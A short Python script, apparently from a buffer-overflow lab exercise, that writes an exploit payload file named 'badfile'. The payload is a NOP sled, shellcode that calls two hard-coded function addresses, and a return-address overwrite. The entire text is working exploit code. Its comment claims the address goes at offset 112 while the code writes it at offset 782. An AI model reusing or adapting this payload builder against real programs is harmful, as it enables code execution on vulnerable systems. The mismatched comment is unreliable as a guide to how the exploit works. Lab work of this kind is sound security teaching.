import sys 
 
shellcode= ( 
"\xBB\xA2\x62\x55\x56"
"\xFF\xD3"
"\x50"
"\xBB\x86\x62\x55\x56"
"\xFF\xD3"
).encode('latin-1') 
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(1300)) 
# Put the shellcode at the end 
start = 1300 - len(shellcode) 
content[start:] = shellcode 
 
# Put the address at offset 112 
ret = 0xffffcd48 + 150 
content[782:786] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 

